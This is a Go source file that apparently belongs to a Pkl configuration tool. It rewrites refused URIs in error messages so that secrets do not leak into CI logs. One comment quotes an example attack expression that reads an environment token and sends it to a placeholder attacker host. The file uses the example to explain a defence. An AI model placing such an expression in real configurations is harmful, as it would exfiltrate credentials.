package config

import (
	"regexp"
	"strings"
)

// Pkl reports a blocked access as "Refusing to load module `URI` because …" or
// "Refusing to read resource `URI` because …", for both the allowlists and the
// root directory. Wording verified against pkl 0.32.1.
var refusalRe = regexp.MustCompile("Refusing to (?:load module|read resource) `([^`]*)`")

// scrubRefusals rewrites the URIs in refusal diagnostics.
//
// A refusal is the one Pkl diagnostic whose contents an attacker chooses. The
// whole point of `read("https://evil.example/?leak=" + read("env:TOKEN"))` is to
// move a secret into a URI, and when pklenv blocks the request, the diagnostic
// naming that URI becomes the remaining way out — pklenv would refuse the fetch
// and then print the payload into a CI log itself. So the URI is reduced to the
// part that is pklenv's policy rather than the attacker's message.
//
// Nothing is lost for the honest case, because Pkl's source excerpt survives
// untouched and shows the line that made the request. That excerpt quotes the
// *expression*, not its evaluated result: someone who wrote
// `import "../shared/base.pkl"` still sees exactly that, while a concatenation
// shows as a concatenation rather than as the secret it produced.
//
// Only refusals are touched. Every other diagnostic keeps its full text, since
// a user chasing a typo in a URL wants the whole thing and those messages are
// not attacker-shaped.
func scrubRefusals(msg string) string {
	return refusalRe.ReplaceAllStringFunc(msg, func(match string) string {
		uri := refusalRe.FindStringSubmatch(match)[1]
		return strings.Replace(match, "`"+uri+"`", "`"+safeURI(uri)+"`", 1)
	})
}

// safeURI reduces a refused URI to what pklenv can print without relaying it.
//
// For network schemes the origin survives: it is what the user needs in order to
// write --allow-net, and it cannot carry a payload the way a path or a query
// can. For everything else — file: above all — nothing after the scheme
// survives, because a filesystem path has no equivalent split between "the part
// that identifies where" and "the part an attacker fills in".
func safeURI(uri string) string {
	scheme, rest, found := strings.Cut(uri, ":")
	if !found {
		return "…"
	}
	switch scheme {
	case "env":
		// The variable's name is the whole diagnostic here, and a name is not a
		// value: pklenv already prints names freely in its unredacted-secret
		// warning, on the principle that naming a variable is safe and printing
		// its contents is not. A config could of course build a name out of a
		// secret, but the source excerpt shows that as the concatenation it is.
		return uri
	case "http", "https", "package", "projectpackage":
		authority := origin(rest)
		if authority == "" {
			return scheme + ":…"
		}
		return scheme + "://" + authority + "/…"
	default:
		return scheme + ":…"
	}
}

// origin extracts the host from the part of a URI after the scheme.
//
// The path is cut off first and userinfo only afterwards, because the order
// matters for package URIs: "package://host/name@1.0.0" carries an `@` in its
// version, and stripping userinfo first would treat the host as credentials and
// discard it.
func origin(rest string) string {
	authority := strings.TrimPrefix(rest, "//")
	if slash := strings.IndexAny(authority, "/?#"); slash >= 0 {
		authority = authority[:slash]
	}
	// "https://user:pass@host/" would otherwise put credentials in the log.
	if at := strings.LastIndex(authority, "@"); at >= 0 {
		authority = authority[at+1:]
	}
	return authority
}

// refusedScheme returns the URI scheme of the first refusal in a diagnostic, so
// that a hint can address the flag that actually governs it. Empty when the
// message is not a refusal.
func refusedScheme(msg string) string {
	m := refusalRe.FindStringSubmatch(msg)
	if m == nil {
		return ""
	}
	scheme, _, _ := strings.Cut(m[1], ":")
	return scheme
}

// refusedName returns the resource name from an `env:` refusal, for a hint the
// user can copy.
func refusedName(msg string) string {
	m := refusalRe.FindStringSubmatch(msg)
	if m == nil {
		return ""
	}
	name, found := strings.CutPrefix(m[1], "env:")
	if !found {
		return ""
	}
	return name
}

// refusedHost returns the origin of the first refused URI, for a hint that can
// be copied onto the command line. Empty when the refusal names no network URI.
func refusedHost(msg string) string {
	m := refusalRe.FindStringSubmatch(msg)
	if m == nil {
		return ""
	}
	uri := m[1]
	scheme, rest, found := strings.Cut(uri, ":")
	if !found {
		return ""
	}
	switch scheme {
	case "http", "https", "package", "projectpackage":
	default:
		return ""
	}
	authority := origin(rest)
	// The hint is a suggestion the user will paste, so a plaintext origin has to
	// keep its scheme — a bare host in --allow-net means https only.
	if scheme == "http" {
		return "http://" + authority
	}
	return authority
}
